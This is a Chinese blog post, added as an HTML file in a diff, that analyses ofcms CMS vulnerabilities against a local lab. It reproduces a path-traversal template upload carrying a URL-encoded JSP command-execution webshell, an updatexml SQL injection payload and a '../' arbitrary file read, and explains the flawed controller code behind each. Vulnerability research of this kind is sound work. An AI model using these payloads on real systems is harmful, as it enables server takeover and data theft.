@@ -1,0 +1,461 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sp4z">
+  <meta name="keywords" content="">
+  
+  <title>ofcms漏洞分析 - sp4z&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="ofcms漏洞分析">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-09-01 19:27" pubdate>
+        2021年9月1日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      915 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      16
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ofcms漏洞分析</h1>
+            
+            <div class="markdown-body">
+              <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录后台</p>
+<p><a href="https://imgtu.com/i/hBrkp8"><img src="https://z3.ax1x.com/2021/09/01/hBrkp8.png" srcset="/img/loading.gif" lazyload alt="hBrkp8.png"></a></p>
+<p>抓包并按如下方式修改POST数据包，file_content是jsp马的内容</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /ofcms_admin_war/admin/cms/template/save.json HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">8080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">91</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">91</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: application/json, text/javascript, */*; q=<span class="hljs-number">0</span>.<span class="hljs-number">01</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded; charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">X</span>-Requested-With: XMLHttpRequest<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">5153</span><br><span class="hljs-attribute">Origin</span>: http://localhost:<span class="hljs-number">8080</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://localhost:<span class="hljs-number">8080</span>/ofcms_admin_war/admin/cms/template/getTemplates.html<br><span class="hljs-attribute">Cookie</span>: JSESSIONID=<span class="hljs-number">3</span>EC<span class="hljs-number">1</span>F<span class="hljs-number">4130</span>CDBC<span class="hljs-number">342</span>A<span class="hljs-number">5</span>DAB<span class="hljs-number">0</span>F<span class="hljs-number">478</span>E<span class="hljs-number">405</span>AA; cookieconsent_status=dismiss; Phpstorm-<span class="hljs-number">8</span>e<span class="hljs-number">4</span>b<span class="hljs-number">56</span>ac=beb<span class="hljs-number">94186</span>-<span class="hljs-number">86</span>bf-<span class="hljs-number">4</span>a<span class="hljs-number">9</span>d-<span class="hljs-number">832</span>a-<span class="hljs-number">863045</span>cf<span class="hljs-number">4</span>b<span class="hljs-number">2</span>f; Hm_lvt_c<span class="hljs-number">12</span>f<span class="hljs-number">88</span>b<span class="hljs-number">5</span>c<span class="hljs-number">1</span>cd<span class="hljs-number">041</span>a<span class="hljs-number">732</span>dea<span class="hljs-number">597</span>a<span class="hljs-number">5</span>ec<span class="hljs-number">94</span>c=<span class="hljs-number">1609381035</span>; bdshare_firstime=<span class="hljs-number">1609381035017</span>; Hm_lvt_d<span class="hljs-number">6</span>ceebbfea<span class="hljs-number">56</span>af<span class="hljs-number">954</span>e<span class="hljs-number">58</span>ccea<span class="hljs-number">336</span>c<span class="hljs-number">10</span>d<span class="hljs-number">8</span>=<span class="hljs-number">1612666019</span>,<span class="hljs-number">1614563564</span>; UM_distinctid=<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>c<span class="hljs-number">31</span>-<span class="hljs-number">0</span>aacb<span class="hljs-number">8</span>a<span class="hljs-number">3</span>b<span class="hljs-number">601</span>b<span class="hljs-number">4</span>-<span class="hljs-number">4</span>c<span class="hljs-number">3</span>f<span class="hljs-number">227</span>c-<span class="hljs-number">1</span>fa<span class="hljs-number">400</span>-<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>d<span class="hljs-number">5</span>d<span class="hljs-number">8</span>; CNZZDATA<span class="hljs-number">1277972876</span>=<span class="hljs-number">1856010917</span>-<span class="hljs-number">1614837798</span>-%<span class="hljs-number">7</span>C<span class="hljs-number">1614837798</span>; Hm_lvt_b<span class="hljs-number">60316</span>de<span class="hljs-number">6009</span>d<span class="hljs-number">5654</span>de<span class="hljs-number">7312</span>f<span class="hljs-number">772162</span>be=<span class="hljs-number">1621413156</span>,<span class="hljs-number">1621496582</span>; KCFINDER_showname=<span class="hljs-literal">on</span>; KCFINDER_showsize=<span class="hljs-literal">off</span>; KCFINDER_showtime=<span class="hljs-literal">off</span>; KCFINDER_order=name; KCFINDER_orderDesc=<span class="hljs-literal">off</span>; KCFINDER_view=thumbs; KCFINDER_displaySettings=<span class="hljs-literal">off</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: empty<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: cors<br><span class="hljs-attribute">Sec</span>-Fetch-Site: same-origin<br><br><span class="hljs-attribute">file_name</span>=../../../test.jsp&amp;file_content=%<span class="hljs-number">3</span>c%<span class="hljs-number">25</span>%<span class="hljs-number">40</span>%<span class="hljs-number">20</span>%<span class="hljs-number">70</span>%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">70</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">74</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">22</span>%<span class="hljs-number">6</span>a%<span class="hljs-number">61</span>%<span class="hljs-number">76</span>%<span class="hljs-number">61</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">2</span>e%<span class="hljs-number">2</span>a%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>%<span class="hljs-number">25</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">3</span>c%<span class="hljs-number">25</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">53</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">67</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">64</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">50</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">64</span>%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">50</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">68</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">52</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">52</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">65</span>%<span class="hljs-number">63</span>%<span class="hljs-number">28</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">64</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">70</span>%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">53</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">68</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">70</span>%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">53</span>%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">77</span>%<span class="hljs-number">68</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">28</span>%<span class="hljs-number">63</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">2</span>e%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">31</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">6</span>f%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">70</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">28</span>%<span class="hljs-number">63</span>%<span class="hljs-number">68</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">29</span>%<span class="hljs-number">63</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">2</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">63</span>%<span class="hljs-number">68</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">64</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">77</span>%<span class="hljs-number">61</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">7</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">63</span>%<span class="hljs-number">68</span>%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">72</span>%<span class="hljs-number">75</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">64</span>%<span class="hljs-number">45</span>%<span class="hljs-number">78</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">65</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">70</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">53</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">54</span>%<span class="hljs-number">72</span>%<span class="hljs-number">61</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">7</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">63</span>%<span class="hljs-number">68</span>%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">49</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">45</span>%<span class="hljs-number">78</span>%<span class="hljs-number">63</span>%<span class="hljs-number">65</span>%<span class="hljs-number">70</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">53</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">2</span>e%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">70</span>%<span class="hljs-number">72</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">6</span>e%<span class="hljs-number">28</span>%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">25</span>%<span class="hljs-number">3</span>e<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>上传成功</p>
+<p><a href="https://imgtu.com/i/hBriff"><img src="https://z3.ax1x.com/2021/09/01/hBriff.png" srcset="/img/loading.gif" lazyload alt="hBriff.png"></a></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>/ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/cms/TemplateController</p>
+<p>文件名和文件内容由参数file_name和file_content可控，可以写入任意文件</p>
+<p><a href="https://imgtu.com/i/hBrA1S"><img src="https://z3.ax1x.com/2021/09/01/hBrA1S.png" srcset="/img/loading.gif" lazyload alt="hBrA1S.png"></a></p>
+<h1 id="后台SQL注入"><a href="#后台SQL注入" class="headerlink" title="后台SQL注入"></a>后台SQL注入</h1><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登陆后台，执行sql语句</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">update of_cms_link <span class="hljs-builtin-name">set</span> <span class="hljs-attribute">link_name</span>=updatexml(1,concat(0x7e,database()),0) where <span class="hljs-attribute">link_id</span>=1<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/hBrm0s"><img src="https://z3.ax1x.com/2021/09/01/hBrm0s.png" srcset="/img/loading.gif" lazyload alt="hBrm0s.png"></a></p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>/ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/system/SystemGenerateController</p>
+<p>接收sql参数，传入update方法</p>
+<p><a href="https://imgtu.com/i/hBrPtP"><img src="https://z3.ax1x.com/2021/09/01/hBrPtP.png" srcset="/img/loading.gif" lazyload alt="hBrPtP.png"></a></p>
+<p>经过一系列update方法，最后prepareStatement预编译执行sql语句，因为这里的sql语句是完全可控的，没有事先用<code>?</code>占位，所以预编译并没有起到防御SQL注入的作用</p>
+<p><a href="https://imgtu.com/i/hBrE6g"><img src="https://z3.ax1x.com/2021/09/01/hBrE6g.png" srcset="/img/loading.gif" lazyload alt="hBrE6g.png"></a></p>
+<p><a href="https://imgtu.com/i/hBrVXQ"><img src="https://z3.ax1x.com/2021/09/01/hBrVXQ.png" srcset="/img/loading.gif" lazyload alt="hBrVXQ.png"></a></p>
+<p><a href="https://imgtu.com/i/hBremj"><img src="https://z3.ax1x.com/2021/09/01/hBremj.png" srcset="/img/loading.gif" lazyload alt="hBremj.png"></a></p>
+<p><a href="https://imgtu.com/i/hBrCkt"><img src="https://z3.ax1x.com/2021/09/01/hBrCkt.png" srcset="/img/loading.gif" lazyload alt="hBrCkt.png"></a></p>
+<h1 id="任意文件读取-amp-目录遍历"><a href="#任意文件读取-amp-目录遍历" class="headerlink" title="任意文件读取&amp;目录遍历"></a>任意文件读取&amp;目录遍历</h1><h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>web.xml位置</p>
+<p><a href="https://imgtu.com/i/hBrQhV"><img src="https://z3.ax1x.com/2021/09/01/hBrQhV.png" srcset="/img/loading.gif" lazyload alt="hBrQhV.png"></a></p>
+<p>读取web.xml</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/ofcms_admin_war/</span>admin<span class="hljs-regexp">/cms/</span>template<span class="hljs-regexp">/getTemplates.html?dir=../</span>../&amp;file_name=web.xml<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/hBrn7n"><img src="https://z3.ax1x.com/2021/09/01/hBrn7n.png" srcset="/img/loading.gif" lazyload alt="hBrn7n.png"></a></p>
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>/ofcms-admin/src/main/java/com/ofsoft/cms/admin/controller/cms/TemplateController</p>
+<p><code>SystemUtile.getSiteTemplatePath()</code>返回模板文件目录，然后和可控参数<code>dir</code>拼接，造成目录穿越</p>
+<p><a href="https://imgtu.com/i/hBrMt0"><img src="https://z3.ax1x.com/2021/09/01/hBrMt0.png" srcset="/img/loading.gif" lazyload alt="hBrMt0.png"></a></p>
+<p>此时已经穿越到指定目录，filename文件名可控，可调用<code>FileUtils.readString</code>读取目标目录下任意文件</p>
+<p><a href="https://imgtu.com/i/hBrKkq"><img src="https://z3.ax1x.com/2021/09/01/hBrKkq.png" srcset="/img/loading.gif" lazyload alt="hBrKkq.png"></a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/solitudi/article/details/117047070?spm=1001.2014.3001.5501">https://blog.csdn.net/solitudi/article/details/117047070?spm=1001.2014.3001.5501</a></p>
+<p><a href="https://blog.csdn.net/solitudi/article/details/117048861">https://blog.csdn.net/solitudi/article/details/117048861</a></p>
+<p><a href="https://y4tacker.blog.csdn.net/article/details/117046188?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-12.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-12.control">https://y4tacker.blog.csdn.net/article/details/117046188?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-12.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-12.control</a></p>
+<p><a href="https://blog.csdn.net/Alexz__/article/details/116426132">https://blog.csdn.net/Alexz__/article/details/116426132</a></p>
+
+            </div>
